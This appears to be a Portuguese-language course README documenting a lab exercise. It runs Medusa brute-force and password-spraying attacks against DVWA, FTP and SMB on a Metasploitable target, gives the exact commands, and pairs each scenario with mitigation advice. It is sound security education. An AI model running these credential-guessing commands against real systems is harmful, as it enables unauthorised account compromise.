# Desafio: Simulando um Ataque de Brute Force com Kali Linux e Medusa

Projeto prático desenvolvido para documentar o desafio da [DIO](https://web.dio.me/lab/criando-um-ataque-de-brute-force-de-senhas-com-medusa-e-kali-linux/learning/f43c7f6d-87fa-4f84-9471-a3dc3cc6fac7), aplicando testes de segurança em ambiente controlado.

## 🎯 Objetivo
Simular ataques de força bruta e testes de autenticação em diferentes serviços (Web/DVWA, FTP e SMB) utilizando a ferramenta **Medusa** e propor medidas de mitigação.

## 🛠️ Ambiente e Ferramentas
* **Kali Linux** (Máquina Atacante)
* **Metasploitable 2 / DVWA** (Damn Vulnerable Web Application - Alvo)
* **Medusa** (Ferramenta de auditoria de senhas para serviços de rede e web)

---

## 📂 Cenário 1: Formulário Web (DVWA)
Para realizar o teste de auditoria no formulário web via método POST, foi executado o seguinte comando com o Medusa:

```bash
medusa -h 10.0.2.3 -U users.txt -P passwd.txt -M http -m URL="/dvwa/vulnerabilities/brute/index.php" -m FORM="username=^USER^&password=^PASS^&Login=Login"
```
📊 Evidência de Sucesso (Web)
Resultado do terminal ao validar corretamente as credenciais do laboratório:

ACCOUNT FOUND: [http] Host: 10.0.2.3 User: admin Password: password [SUCCESS]

🛡️ Recomendações de Mitigação (Web)
Políticas de Senhas Fortes: Implementar a exigência de senhas complexas e longas.

Bloqueio Temporário (Account Lockout): Bloquear contas após tentativas sucessivas de acesso inválido.

Autenticação Multifator (MFA): Adicionar camadas adicionais de validação.

## 📂 Cenário 2: Força Bruta em FTP
Para auditar o serviço de FTP (porta 21) do ambiente alvo, que transfere dados e credenciais em texto claro, foi utilizado o módulo nativo de FTP do Medusa:

````bash
medusa -h 10.0.2.3 -U users.txt -P passwd.txt -M ftp
````

📊 Evidência (FTP)
🛡️ Recomendações de Mitigação (FTP)
Desabilitar FTP Inseguro: Migrar o serviço para SFTP (via SSH) para garantir criptografia de ponta a ponta.

Bloqueio de IP: Configurar ferramentas como o Fail2Ban para banir temporariamente endereços IP após múltiplas falhas.

## 📂 Cenário 3: Password Spraying em SMB
Para auditar o protocolo de compartilhamento de arquivos (SMB) utilizando a técnica de Password Spraying (testar uma única senha comum contra vários usuários), foi executado o comando:
````bash
medusa -h 10.0.2.3 -U users.txt -p "password" -M smbnt
````
📊 Evidência (SMB)
🛡️ Recomendações de Mitigação (SMB)
Desabilitar SMBv1: Utilizar versões modernas e seguras do protocolo.

Assinatura SMB (SMB Signing): Exigir assinatura digital nos pacotes para evitar ataques de interceptação.

Políticas de Bloqueio: Aplicar políticas rígidas de bloqueio de conta para mitigar táticas de Password Spraying.
